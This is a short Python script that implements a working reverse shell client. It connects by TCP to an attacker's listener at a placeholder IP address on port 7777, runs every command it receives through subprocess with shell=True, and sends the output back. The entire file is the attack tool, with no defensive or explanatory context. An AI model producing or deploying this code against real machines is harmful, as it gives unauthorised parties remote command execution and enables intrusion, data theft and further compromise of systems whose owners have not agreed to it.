import socket
import subprocess

# IP and port of the reverse shell server
IP = "inputyourthelisteningIP"
PORT = 7777

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to the server
client.connect((IP, PORT))

# receive the command from the server
while True:
    command = client.recv(1024).decode()
    if command == "exit":
        break
    # execute the command and send the result back to the server
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    client.send(output.stdout)

# close the connection
client.close()
